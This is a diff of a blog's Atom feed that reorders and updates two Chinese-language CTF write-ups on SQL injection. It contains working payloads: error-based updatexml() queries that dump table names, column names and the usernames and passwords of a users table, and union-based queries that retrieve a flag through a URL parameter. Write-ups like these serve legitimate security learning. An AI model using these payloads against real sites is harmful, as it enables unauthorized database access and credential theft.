@@ -60,8 +60,8 @@
     <title>13</title>
     <link href="http://example.com/2022/02/21/13/"/>
     <id>http://example.com/2022/02/21/13/</id>
-    <published>2022-02-21T14:46:32.000Z</published>
-    <updated>2022-02-22T07:33:25.473Z</updated>
+    <published>2022-02-21T14:46:32.779Z</published>
+    <updated>2022-02-23T12:38:20.955Z</updated>
     
     <content type="html"><![CDATA[<p>运用1’  1进行输入可知此题数据有’)所覆盖，再使用1’) or ‘1’=1– +进行试登发现没有回显<br>这里是会输出数据库报错的。所以是可以进行报错注入。</p><p>而且这里一个红色图片和一个蓝色图片，典型的可以进行布尔盲注。</p><p>这里使一下报错注入：（但是只能有32位回显，需要分次进行破解，除此之外可用之前burb进行破解）<br><img src="https://s2.loli.net/2022/02/22/37RdWoOIxwsVq5F.png" alt="1"><br>    1’) union select 1,updatexml(1,concat(0x7e,database(),0x7e),1)#<br><img src="https://s2.loli.net/2022/02/22/i1lVImx5F3WQRj4.png" alt="2"><br>    1’) union select 1,updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),0x7e),1)#</p><p><img src="https://s2.loli.net/2022/02/22/vgEeZIVH5li1aD8.png" alt="3"><br>    uname=1’) union select 1,updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name=’users’),1,31),0x7e),1)#</p><pre><code>uname=1&#39;) union select 1,updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),32,63)0x7e),1)#</code></pre><p><img src="https://s2.loli.net/2022/02/22/pqiVHOU9PmLgY5S.png" alt="4"><br>uname=1’) union select 1,updatexml(1,concat(0x7e,substr((select group_concat(id,password,username) from users),1,31),0x7e),1)#<br><img src="https://s2.loli.net/2022/02/22/vi7ArIHm8kyDFV6.png" alt="5"></p>]]></content>
     
@@ -231,26 +231,6 @@ f</summary>
   </entry>
   
   <entry>
-    <title>easy sql</title>
-    <link href="http://example.com/1970/01/01/easy%20sql/"/>
-    <id>http://example.com/1970/01/01/easy%20sql/</id>
-    <published>1970-01-01T00:00:02.021Z</published>
-    <updated>2021-11-13T09:03:03.383Z</updated>
-    
-    <content type="html"><![CDATA[<p><img src="https://i.loli.net/2021/11/13/Z7TMRVi92p5raCc.png" alt="1"><br>由题目可知此题为联合查询输入-1因为数据中没有输入的值以空位代替，显示的为union select 后所输入的值<br><img src="https://i.loli.net/2021/11/13/C2sXQnDSt5i4rZ1.png" alt="2"><br>由打入1’可知进入数据库的数据有’  ‘ 包裹<br>在地址后输入：?wllm=-1’ union select 1,2,database()–+以此来查询库的位置database（）即打印库的位置，–+注释了输入数据之后’limit0，1，以此来显示出自己查表所显示的数值<br><img src="https://i.loli.net/2021/11/13/OmGi7adEkJX1sUL.png" alt="3"><br>之后查表输入：?wllm=-1’ union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database() –+<br><img src="https://i.loli.net/2021/11/13/GM4PJy1KHIFbrNA.png" alt="4"><br>查到表后猜测相应的flag在test_tb中<br>差表中数据输入：?wllm=-1’ union select 1,2,group_concat(column_name)from information_schema.columns where table_name=’test_tb’ –+<br><img src="https://i.loli.net/2021/11/13/tPvE9qOQo8UR3mk.png" alt="5"><br>最后就是输出flag中的数据<br>输入：?wllm=-1’ union select 1,2,group_concat(flag)from test_tb –+<br><img src="https://i.loli.net/2021/11/13/HPCzUR1A76wlgmG.png" alt="6"></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2021/11/13/Z7TMRVi92p5raCc.png&quot; alt=&quot;1&quot;&gt;&lt;br&gt;由题目可知此题为联合查询输入-1因为数据中没有输入的值以空位代替，显示的为union select 后所输入的值&lt;br&gt;&lt;img</summary>
-      
-    
-    
-    
-    
-  </entry>
-  
-  <entry>
     <title>My New Post</title>
     <link href="http://example.com/1970/01/01/My-New-Post/"/>
     <id>http://example.com/1970/01/01/My-New-Post/</id>
@@ -276,6 +256,26 @@ f</summary>
       
       
     <summary type="html">&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2021/11/21/zWFwV6krjp5t1nI.png&quot; alt=&quot;1.png&quot;&gt;&lt;br&gt;&lt;img src=&quot;https://i.loli.net/2021/11/21/zZu94Frl1QnVhqk.png&quot;</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>easy sql</title>
+    <link href="http://example.com/1970/01/01/easy%20sql/"/>
+    <id>http://example.com/1970/01/01/easy%20sql/</id>
+    <published>1970-01-01T00:00:02.021Z</published>
+    <updated>2021-11-13T09:03:03.383Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://i.loli.net/2021/11/13/Z7TMRVi92p5raCc.png" alt="1"><br>由题目可知此题为联合查询输入-1因为数据中没有输入的值以空位代替，显示的为union select 后所输入的值<br><img src="https://i.loli.net/2021/11/13/C2sXQnDSt5i4rZ1.png" alt="2"><br>由打入1’可知进入数据库的数据有’  ‘ 包裹<br>在地址后输入：?wllm=-1’ union select 1,2,database()–+以此来查询库的位置database（）即打印库的位置，–+注释了输入数据之后’limit0，1，以此来显示出自己查表所显示的数值<br><img src="https://i.loli.net/2021/11/13/OmGi7adEkJX1sUL.png" alt="3"><br>之后查表输入：?wllm=-1’ union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database() –+<br><img src="https://i.loli.net/2021/11/13/GM4PJy1KHIFbrNA.png" alt="4"><br>查到表后猜测相应的flag在test_tb中<br>差表中数据输入：?wllm=-1’ union select 1,2,group_concat(column_name)from information_schema.columns where table_name=’test_tb’ –+<br><img src="https://i.loli.net/2021/11/13/tPvE9qOQo8UR3mk.png" alt="5"><br>最后就是输出flag中的数据<br>输入：?wllm=-1’ union select 1,2,group_concat(flag)from test_tb –+<br><img src="https://i.loli.net/2021/11/13/HPCzUR1A76wlgmG.png" alt="6"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2021/11/13/Z7TMRVi92p5raCc.png&quot; alt=&quot;1&quot;&gt;&lt;br&gt;由题目可知此题为联合查询输入-1因为数据中没有输入的值以空位代替，显示的为union select 后所输入的值&lt;br&gt;&lt;img</summary>
       
     
     
